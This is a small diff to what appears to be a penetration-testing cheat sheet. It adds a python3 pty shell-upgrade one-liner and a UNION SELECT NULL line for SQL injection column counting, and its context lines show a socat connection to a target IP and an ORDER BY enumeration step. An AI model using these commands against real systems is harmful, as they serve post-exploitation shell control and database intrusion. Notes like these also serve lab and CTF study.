@@ -3216,6 +3216,7 @@ with open("file_name_here","mode_here",encoding="encoding_here") as file:
 
 # upgrade shell
 python -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 # simple connection script
 ## PY2
@@ -3834,6 +3835,7 @@ socat - OPENSSL:target_IP:443,verify=0
 ```sql
 # determine no. of columns in table : (error - 1) =  no_columns
 ORDER BY increasing_no_here
+UNION SELECT NULL,NULL # increase no. of NULL
 
 # return no_here columns
 LIMIT no_here
